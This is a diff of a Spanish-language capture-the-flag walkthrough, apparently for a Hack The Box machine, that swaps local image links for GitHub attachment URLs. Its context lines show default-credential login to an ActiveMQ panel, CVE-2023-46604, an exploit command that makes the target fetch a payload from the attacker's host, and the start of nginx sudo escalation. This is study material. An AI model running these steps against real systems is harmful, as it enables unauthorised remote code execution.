@@ -1,7 +1,5 @@
 
-
-
-![[Pasted image 20250507190232.png]]
+![image](https://github.com/user-attachments/assets/ad7629bb-ca7a-46f4-8a04-134d4e9062cb)
 
 
 **Publicado:** 07 de Mayo de 2025 
@@ -143,19 +141,23 @@ echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
 
 Al intentar acceder al servidor nginx que está ejecutándose en este puerto encontramos encontramos un panel de autenticación autenticación HTTP básica
 
-![[Pasted image 20250507190920.png]]
+![image](https://github.com/user-attachments/assets/aff59d1b-2c1e-46c3-8a4f-5473f7cb409f)
+
 
 Al probar con las credenciales básicas `admin:admin`logramos acceder sin mayor problema y observar que se está ejecutado un servicio de colas MQ. 
-![[Pasted image 20250507191303.png]]
+![image](https://github.com/user-attachments/assets/2bb258f7-4944-4921-995a-2b497cdd2efd)
+
 
 Accedemos a las opciones de configuración:
-![[Pasted image 20250507191443.png]]
+![image](https://github.com/user-attachments/assets/f1f1eac3-5e77-41ad-aa7a-8cbf3ee5f748)
+
 
 Encontramos la versión del servicio que es la 5.15.15, información que ya habíamos logrado enumerar también gracias a banner grabbing de nmap.
 
 Buscando información sobre posibles exploits para esta versión encontramos que hay un  [CVE-2023-46604](https://github.com/advisories/GHSA-crg9-44h2-xw35)
 
-![[Pasted image 20250507192031.png]]
+![image](https://github.com/user-attachments/assets/ee5a3e70-473b-4f27-a23a-ae15059beeef)
+
 
 ## 💣 Explotación
 
@@ -207,7 +209,8 @@ Lanzamos el exploit y ganamos acceso remoto al servidor como usuario activemq:
  python exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.7/poc.xml
 ```
 
-![[Pasted image 20250507193434.png]]
+![image](https://github.com/user-attachments/assets/93f4d6f0-3c14-4b89-942d-0cf3bbd2d137)
+
 
 
 ## 🛠️ Mejora de la Shell
@@ -268,11 +271,13 @@ User activemq may run the following commands on broker:
 
 Si ejecutamos nginx vemos que falla porque el puerto 80 está ocupado:
 
-![[Pasted image 20250507200310.png]]
+![image](https://github.com/user-attachments/assets/255f72c9-e726-4690-861d-fab6a87f6851)
+
 
 Si revisamos la ayuda de este programa vemos que una opción (-c) que permite especificar un archivo de configuración:
 
-![[Pasted image 20250507200443.png]]
+![image](https://github.com/user-attachments/assets/890cfc04-1c26-4262-8ebc-dd8183ac162e)
+
 
 ### 🎯 Explotación de nginx con sudo
 
